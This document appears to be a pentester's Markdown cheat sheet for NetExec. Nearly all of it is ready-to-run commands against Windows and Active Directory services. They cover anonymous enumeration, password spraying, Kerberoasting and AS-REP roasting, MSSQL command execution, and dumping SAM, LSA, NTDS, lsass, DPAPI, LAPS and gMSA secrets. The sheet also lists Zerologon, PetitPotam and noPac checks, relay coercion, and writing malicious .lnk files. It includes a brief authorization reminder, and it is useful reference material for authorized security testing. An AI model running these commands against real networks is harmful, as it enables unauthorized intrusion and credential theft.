# Netexec



### Basic usage

```
netexec <service> <target> -u <username> -p <password>
netexec <service> <target> -u <username> -H <hash>
```

**Example (SMB):**

```
netexec smb target -u username -p password
```

***

### Authentication (common patterns)

* **Null authentication (anonymous):**

```
netexec smb target -u '' -p ''
```

* **Guest:**

```
netexec smb target -u 'guest' -p ''
```

* **Local account:**

```
netexec smb target -u username -p password --local-auth
```

* **Kerberos:**

```
netexec smb target -u username -p password -k
netexec ldap target --use-kcache
```

* **SMB signing / relay list:**

```
netexec smb target(s) --gen-relay-list relay.txt
```

***

### Enumeration (quick commands)

* **Basic discovery:**

```
netexec smb target
```

* **List shares:**

```
netexec smb target -u '' -p '' --shares
netexec smb target -u username -p password --shares
```

* **List users / RID brute:**

```
netexec smb target -u '' -p '' --users
netexec smb target -u '' -p '' --rid-brute
netexec smb target -u username -p password --users
```

* **Spraying / credential lists (use carefully):**

```
netexec smb target -u users.txt -p password --continue-on-success
netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
netexec ssh target -u username -p password --continue-on-success
```

***

### Service-specific quick reference

#### SMB (common all-in-one)

```
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

* **Extract file from SMB share (Kerberos example):**

```
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```

* **Spider (crawl shares):**

```
netexec smb target -u username -p password -M spider_plus
netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
```

* **Generate hosts / krb5 files:**

```
netexec smb target --generate-hosts-file out_file
netexec smb target -u username -p password --generate-krb5-file out_file
```

#### LDAP

* **User enumeration (anonymous/null):**

```
netexec ldap target -u '' -p '' --users
```

* **All-in-one LDAP enumeration:**

```
netexec ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups
```

* **Kerberoast / ASREPRoast:**

```
netexec ldap target -u username -p password --kerberoasting hash.txt
netexec ldap target -u username -p password --asreproast hash.txt
```

* **BloodHound export:**

```
netexec ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all
```

* **LDAP signing check (module):**

```
netexec ldap target -u username -p password -M ldap-checker
```

* **ADCS / MAQ / pre-created accounts / delegation checks:**

```
netexec ldap target -u username -p password -M adcs
netexec ldap target -u username -p password -M maq
netexec ldap target -u username -p password -M pre2k
nxc ldap target -u username -p password --find-delegation
```

#### MSSQL

* **Auth & command execution:**

```
netexec mssql target -u username -p password
netexec mssql target -u username -p password -x "command_to_execute"
```

* **Extract files from SQL server:**

```
netexec mssql target -u username -p password --get-file output_file target_file
```

#### FTP

* **List & retrieve files:**

```
netexec ftp target -u username -p password --ls
netexec ftp target -u username -p password --ls folder_name
netexec ftp target -u username -p password --ls folder_name --get file_name
```

***

### Credential dumping & secrets (HIGH RISK — lab/authorized only)

* **LSA / SAM:**

```
netexec smb target -u username -p password --lsa
netexec smb target -u username -p password --sam
```

* **NTDS & utilities:**

```
netexec smb target -u username -p password --ntds
netexec smb target -u username -p password -M ntdsutil
```

* **DPAPI / lsass / LAPS / gMSA / GPP / MSOL:**

```
netexec smb target -u username -p password --dpapi
netexec smb target -u username -p password -M lsassy
netexec smb target -u username -p password --laps
netexec ldap target -u username -p password --gmsa
netexec ldap target -u username -p password --gmsa-convert-id id
netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
netexec smb target -u username -p password -M gpp_password
netexec smb target -u username -p password -M msol
```

* **Chain multiple dumps at once:**

```
netexec smb target -u username -p password --sam --lsa --dpapi
```

***

### Vulnerability checks

* **Common AD/SMB checks:**

```
netexec smb target -u username -p password -M zerologon
netexec smb target -u username -p password -M petitpotam
netexec smb target -u username -p password -M nopac
```

***

### Useful modules (short)

* **webdav** — check WebClient / WebDAV exposure: `-M webdav`
* **veeam** — pull creds from Veeam DB: `-M veeam`
* **slinky** — write malicious .lnk with UNC icons: `-M slinky`
* **coerce\_plus** — exercise coerce relays (Printer, PetitPotam, DFSCoerce, etc.): `-M coerce_plus -o LISTENER=tun0_ip`
* **enum\_av** — list AV/EDR products on endpoint: `-M enum_av`
* **backup\_operator** — abuse BackupOperator group to dump NTDS: `-M backup_operator`
* **change-password** — change/reset when privileged: `-M change-password -o USER='target_user' NEWPASS='new_password'`

***

### Quick examples

* **All-in-one SMB gather (auth):**

```
netexec smb 10.10.11.5 -u corp\\svc-foo -p 'Passw0rd!' --groups --users --shares --sessions
```

* **Kerberoast extraction to file:**

```
netexec ldap dc.corp.local -u admin -p 'P@ss' --kerberoasting kerb_hashes.txt
```

***

### Rules of engagement & ethics

* **Always have written authorization** before testing non-owned systems.
* **Prefer passive, non-destructive enumeration first.** Only run intrusive/credential-dump modules in lab or under explicit permission.
* **Treat discovered credentials as extremely sensitive** — store/encrypt/destroy per policy.
* **Report critical findings immediately** to owners and provide actionable remediation.

***

### TL;DR — Why use `netexec`?

* Centralizes multi-protocol enumeration and post-exploitation.
* Rapid automation of common AD/SMB/LDAP checks and extraction workflows.
* Helpful modules for targeted checks (veeam, webdav, coerce, etc.).

***

### Hashtags

`#netexec #pentest #redteam #blueteam #ADsecurity #SMB #LDAP #credentialaudit #vulncheck #infosec`

***

_Save this file as `Netexec-cheatsheet.md` for quick reference._
